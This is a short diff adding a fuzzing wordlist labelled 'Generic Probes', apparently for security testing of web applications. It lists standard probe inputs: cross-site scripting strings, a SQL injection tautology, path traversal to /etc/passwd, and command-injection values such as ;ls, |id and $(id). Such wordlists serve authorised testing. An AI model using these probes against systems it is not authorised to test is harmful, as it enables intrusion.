@@ -1,0 +1,14 @@
+# Generic Probes (combined safe set)
+'
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+' OR 1=1--
+../etc/passwd
+..%2F..%2Fetc%2Fpasswd
+;ls
+|id
+`id`
+$(id)
+%00
+null
+undefined
